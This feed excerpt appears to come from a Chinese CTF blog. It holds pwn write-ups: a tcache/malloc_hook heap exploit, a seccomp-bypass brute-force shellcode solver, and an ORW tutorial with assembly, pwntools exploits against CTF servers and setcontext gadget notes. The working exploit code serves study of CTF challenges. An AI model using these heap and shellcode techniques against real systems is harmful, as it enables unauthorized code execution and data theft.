class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./chall&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(<span class="hljs-string">&quot;opcode:1\npasswd:Cr4at31\n\r\r\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(<span class="hljs-string">&quot;opcode:3\npasswd:Ed1t1\n\r\r\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(<span class="hljs-string">&quot;opcode:2\npasswd:SH0w1\n\r\r\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(<span class="hljs-string">&quot;opcode:4\npasswd:D3l4te1\n\r\r\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f3d5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f432 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a41c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>add(<span class="hljs-number">0x208</span>, <span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x208</span>)<br>add(<span class="hljs-number">0x208</span>, <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x208</span>)<br>add(<span class="hljs-number">0x208</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x4c0</span><br>log.info(<span class="hljs-string">&quot;heap_addr==&gt;0x%x&quot;</span> %heap_addr)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>) <span class="hljs-comment">#新申请的为0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x208</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span>) <span class="hljs-comment">#0</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span> + p64(heap_addr + <span class="hljs-number">0x2e0</span>))<br>show(<span class="hljs-number">1</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>ogg = libc_base + <span class="hljs-number">0x4f432</span><br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span> + p64(mlh - <span class="hljs-number">0x8</span>))<br>edit(<span class="hljs-number">1</span>, p64(ogg) + p64(realloc + <span class="hljs-number">9</span>))<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&gt; &quot;</span>)<br>p.send(<span class="hljs-string">&quot;opcode:1\npasswd:Cr4at31\n\r\r\n&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ezshell"><a href="#ezshell" class="headerlink" title="ezshell"></a>ezshell</h2><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20211003091318701.png" alt="image-20211003091318701"></p><p>程序很简单，总的说就是输入内容，然后转移到可执行的地址上去执行。</p><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20211003091835842.png" alt="image-20211003091835842"></p><p>然后开启了沙箱，只允许使用 open 和 read 函数，同时要求 read 函数的 fd 参数右移32位后仍然大于0或者是大等.于4</p><p><img src="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/image-20211003091716855.png" alt="image-20211003091716855"></p><p>可写可执行段在0x10000~0x11000</p><p>首先orw是没跑了，但是没有write，所以只能是逐字节进行爆破的思想：根据是否异常区分爆破的字符对错。但是我愣是没做出来，算了，思想知道就行，官方wp我跑了本地也没出，差评！</p><p>贴个官方的wp好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br><span class="hljs-keyword">from</span> ae64 <span class="hljs-keyword">import</span> AE64  <br><span class="hljs-keyword">if</span> args[<span class="hljs-string">&#x27;DEBUG&#x27;</span>]:  <br>    context.log_level = <span class="hljs-string">&quot;debug&quot;</span>  <br>code = ELF(<span class="hljs-string">&quot;./chall&quot;</span>)  <br>context.arch=code.arch  <br>  <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">payload</span>(<span class="hljs-params">idx, ch</span>):</span>  <br>    tmp = <span class="hljs-string">&#x27;&#x27;&#x27;&#x27;&#x27; </span><br><span class="hljs-string">    open_sec: </span><br><span class="hljs-string">            xor rax, rax </span><br><span class="hljs-string">            add al, 2 </span><br><span class="hljs-string">            jmp x </span><br><span class="hljs-string">        y:  pop rdi </span><br><span class="hljs-string">            xor rsi,rsi </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">            xor rax, rax </span><br><span class="hljs-string">            add al, 2 </span><br><span class="hljs-string">            jmp p </span><br><span class="hljs-string">        q:  pop rdi </span><br><span class="hljs-string">            xor rsi,rsi </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">            push rax </span><br><span class="hljs-string">            pop rdi </span><br><span class="hljs-string">            xor rax, rax </span><br><span class="hljs-string">            xor rdx, rdx </span><br><span class="hljs-string">            add dl, 0xff </span><br><span class="hljs-string">            mov rsi, rsp </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">            mov al, [rsp+&#123;&#125;] </span><br><span class="hljs-string">            cmp al, &#123;&#125; </span><br><span class="hljs-string">            jne tmp </span><br><span class="hljs-string">            jmp $ </span><br><span class="hljs-string">        tmp: </span><br><span class="hljs-string">            xor rax,rax  </span><br><span class="hljs-string">            add al,60 </span><br><span class="hljs-string">            xor rdi,rdi </span><br><span class="hljs-string">            syscall </span><br><span class="hljs-string">        x: </span><br><span class="hljs-string">            call y </span><br><span class="hljs-string">            .string &quot;./flag&quot; </span><br><span class="hljs-string">        p: </span><br><span class="hljs-string">            call q </span><br><span class="hljs-string">            .string &quot;./flag&quot; </span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(idx, <span class="hljs-built_in">ord</span>(ch))  <br>  <br>    shellcode = asm(tmp)  <br>    <span class="hljs-comment"># get alphanumeric shellcode  </span><br>      <br>    <span class="hljs-keyword">return</span> AE64().encode(shellcode, <span class="hljs-string">&#x27;rdx&#x27;</span>).decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)  <br>  <br>flag = <span class="hljs-string">&#x27;&#x27;</span>  <br>i = <span class="hljs-number">0</span>  <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> string.printable:  <br>        conn = process(<span class="hljs-string">&quot;./chall&quot;</span>)    <br>        conn.sendlineafter(<span class="hljs-string">&quot;?\n&quot;</span>, payload(i, x))  <br>        <span class="hljs-keyword">try</span>:  <br>            conn.recv(<span class="hljs-number">1</span>, timeout=<span class="hljs-number">1</span>)  <br>        <span class="hljs-keyword">except</span> EOFError:  <br>            conn.close()  <br>            <span class="hljs-keyword">continue</span>  <br>        <span class="hljs-built_in">print</span>(flag,i)  <br>        flag += x  <br>        i += <span class="hljs-number">1</span>  <br>        conn.close()  <br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> flag:  <br>            <span class="hljs-built_in">print</span>(flag)  <br>            exit()  <br>        <span class="hljs-keyword">break</span>  <br>  <br>conn.interactive()  <br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;太菜了，一题没出；又是抱着大佬WP跟着复现~&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;http://www.darry-long.top/20</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>orw</title>
    <link href="http://example.com/2021/09/21/2021-09-21-orw/"/>
    <id>http://example.com/2021/09/21/2021-09-21-orw/</id>
    <published>2021-09-21T09:02:18.000Z</published>
    <updated>2021-10-13T08:01:24.617Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景前置"><a href="#背景前置" class="headerlink" title="背景前置"></a>背景前置</h2><p>seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。</p><p><code>orw_seccomp函数</code>执行了两次<code>prctl</code>函数（出现prctl就是沙箱的题目）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">第一次调用prctl函数 ————禁止提权<br>第二次调用prctl函数 ————限制能执行的系统调用只有open，<span class="hljs-built_in">write</span>，<span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>意思就是我们不能使用特殊的系统调用getshell，但是可以用open、read、write三个系统调用去读flag</p><h2 id="入门级orw"><a href="#入门级orw" class="headerlink" title="入门级orw"></a>入门级orw</h2><h3 id="一、pwnable-orw"><a href="#一、pwnable-orw" class="headerlink" title="一、pwnable_orw"></a>一、pwnable_orw</h3><p>来自buu上的</p><p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522121233.png"></p><p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522121208.png"></p><p>首先checksec完，发现只开了canary，放入ida看看。发现，可以输入数据，然后还能对输入的数据进行执行调用。因为这开启沙箱，系统调用是无法执行的，只能通过open打开flag，然后read读到缓冲区上，再通过write泄露出来，从而得到flag</p><p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522122706.png"></p><p>第一个exp是自己去构造执行指令，第二个是用pwntool里面自带的shellcraft的功能。相比之下，第二个会更方便许多</p><p>exp的详细解析：（来自<a href="https://blog.csdn.net/qq_44768749/article/details/108256099%EF%BC%89">https://blog.csdn.net/qq_44768749/article/details/108256099）</a></p><p>打开flag文件，sys_open(file,0,0)；系统调用号为5</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">push 0x0  #字符串结尾<br>push 0x67616c66#&#x27;flag&#x27;<br>mov ebx,esp<br>xor ecx,ecx#0<br>xor edx,edx#0<br>mov eax,0x5#调用号<br>int 0x80#sys_open(flags,0,0)<br></code></pre></td></tr></table></figure><p> 读flag文件，sys_read(3,file,0x100)；系统调用号为3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,0x3; <br>mov ecx,ebx;# ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”<br>mov ebx,0x3;# 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件<br>mov edx,0x100;#对应字节数<br>int 0x80;<br></code></pre></td></tr></table></figure><p>输出flag文件内容，sys_write(1,file,0x30)；系统调用号为4</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov eax,0x4;# eax = sys_write<br>mov ebx,0x1;# ebx = unsigned int fd = 1<br>int 0x80;<br></code></pre></td></tr></table></figure><p>exp1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;i386&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27948</span>)<br><br>shellcode=asm(<span class="hljs-string">&#x27;push 0x0;push 0x67616c66;mov ebx,esp;xor ecx,ecx;xor edx,edx;mov eax,0x5;int 0x80&#x27;</span>)<br>shellcode+=asm(<span class="hljs-string">&#x27;mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;</span>)<br>shellcode+=asm(<span class="hljs-string">&#x27;mov eax,0x4;mov ebx,0x1;int 0x80&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;shellcode:&#x27;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>exp2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;i386&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>p=remote(<span class="hljs-string">&quot;node3.buuoj.cn&quot;</span>,<span class="hljs-number">27948</span>)<br>shellcode=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)+shellcraft.read(<span class="hljs-string">&#x27;eax&#x27;</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">0x30</span>)+shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;esp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>p.sendlineafter(<span class="hljs-string">&#x27;shellcode:&#x27;</span>,shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="二、easy-shellcode"><a href="#二、easy-shellcode" class="headerlink" title="二、easy_shellcode"></a>二、easy_shellcode</h3><p>来自2021NEEPU 纳新CTF上的一道题</p><p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522123857.png"></p><p>64位，保护全开</p><p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522123942.png"></p><p><img src="/2021/09/21/2021-09-21-orw/QQ%E5%9B%BE%E7%89%8720210522130822.png"></p><p>跟上面很类似，也是有个直接输入点，然后调用执行输入的数据，借用shellcraft，把寄存器改为64位下的即可获取flag</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;neepusec.club&quot;</span>,<span class="hljs-number">18626</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>shellcode=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>shellcode+=asm(shellcraft.read(<span class="hljs-string">&#x27;rax&#x27;</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>shellcode+=asm(shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;rsp&#x27;</span>,<span class="hljs-number">0x30</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;orw&quot;</span>,shellcode)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="堆上orw"><a href="#堆上orw" class="headerlink" title="堆上orw"></a>堆上orw</h2><p>前面呢，都是一些有关于orw思想的入门基础题，而比赛中常见的都是堆上的orw</p><h3 id="低版本"><a href="#低版本" class="headerlink" title="低版本"></a>低版本</h3><p>一般在 <code>Glibc2.29</code>以前的 <code>ORW</code>解题思路已经比较清晰，主要是劫持 <code>free_hook</code> 或者 <code>malloc_hook</code>写入 <code>setcontext+53</code>函数中的 gadget，通过 <code>rdi</code>索引，来设置相关寄存器，并执行提前布置好的 <code>ORW ROP chains</code></p><p>setcontext+53处的gadget如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs assembly">&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]<br>&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]<br>&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]<br>&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]<br>&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]<br>&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]<br>&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]<br>&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]<br>&lt;setcontext+94&gt;:  push   rcx<br>&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]<br>&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]<br>&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]<br>&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]<br>&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]<br>&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]<br>&lt;setcontext+125&gt;: xor    eax,eax<br>&lt;setcontext+127&gt;: ret<br></code></pre></td></tr></table></figure><p>目的是获得一个可执行的权限，需要注意的是<code>mov rsp, [rdi+0xa0]</code>和<code>mov rcx, [rdi+0xa8]</code>。修改rsp的值将会改变栈指针，因此我们就获得了控制栈的能力，修改rcx的值后接着有个push操作将rcx压栈，然后汇编指令按照顺序会执行代码中最后的ret操作，而ret去执行的地址就是压入栈的rcx值，因此修改rcx就获得了控制程序流程的能力</p><p>但是为了能执行到这，我们先要做的就是劫持free_hook或者malloc_hook为<code>setcontext + 53</code>的地址，跳转到这边来执行上面的gadgets，但这都不是重点，重点是<code>setcontext + 53</code>上的传参设置。因为都是借用rdi传参，刚好我们执行malloc或者free申请或是释放堆块时，传入的第一个参数是堆的地址，是存在rdi上的，所以我们要释放或者申请的堆块的地址十分关键，在其偏移0xa0和0xa8的位置分别填上我们存储orw链内容的地址（注意不是orw的第一个指令地址）和一个ret汇编指令的地址</p><p>注：为什么不能直接是orw的地址：因为执行完setcontext + 53上的gadget会执行ret，而ret执行的rcx指向的地址，如果rcx装的是mprotect的地址，执行完mprotect就会去执行rsp指向的地址，注意是地址！如果前面直接传入rsp的是orw的第一个指令地址，那么ret执行的是把写在上面的指令作为一个地址解析，直接就会报错了，因为rip获取的是栈顶的值，所以要中转一下，前面写的是另外一个地址（一般就直接在shellcode前八个字节的地方），然后在这个地址上写入的才是shellcode的地址</p><p>可以自己算偏移，也可以借用pwntools的SigreturnFrame类直接来构造。此时frame中的rsp和rip对应的就是setcontext的rsp和rcx</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">context.arch</span> = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-attr">frame</span> = SigreturnFrame()<br><span class="hljs-attr">frame.rsp</span> = shellcode_addr<br><span class="hljs-attr">frame.rip</span> = ret_addr<br></code></pre></td></tr></table></figure><p>例题查看我之前的比赛复现题目：<code>K1ng_in_h3Ap_II</code>，<code>Whats your name</code></p><h3 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h3><p>但在 <code>Glibc 2.29</code>之后 <code>setcontext</code>中的gadget变成了以 <code>rdx</code>索引，因此如果我们按照之前思路的话，还要先通过 <code>ROP</code>控制 <code>RDX</code>的值，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:00000000000580DD                 mov     rsp, [rdx+0A0h]<br>.text:00000000000580E4                 mov     rbx, [rdx+80h]<br>.text:00000000000580EB                 mov     rbp, [rdx+78h]<br>.text:00000000000580EF                 mov     r12, [rdx+48h]<br>.text:00000000000580F3                 mov     r13, [rdx+50h]<br>.text:00000000000580F7                 mov     r14, [rdx+58h]<br>.text:00000000000580FB                 mov     r15, [rdx+60h]<br>.text:00000000000580FF                 test    dword ptr fs:48h, 2<br>    ....<br>.text:00000000000581C6                 mov     rcx, [rdx+0A8h]<br>.text:00000000000581CD                 push    rcx<br>.text:00000000000581CE                 mov     rsi, [rdx+70h]<br>.text:00000000000581D2                 mov     rdi, [rdx+68h]<br>.text:00000000000581D6                 mov     rcx, [rdx+98h]<br>.text:00000000000581DD                 mov     r8, 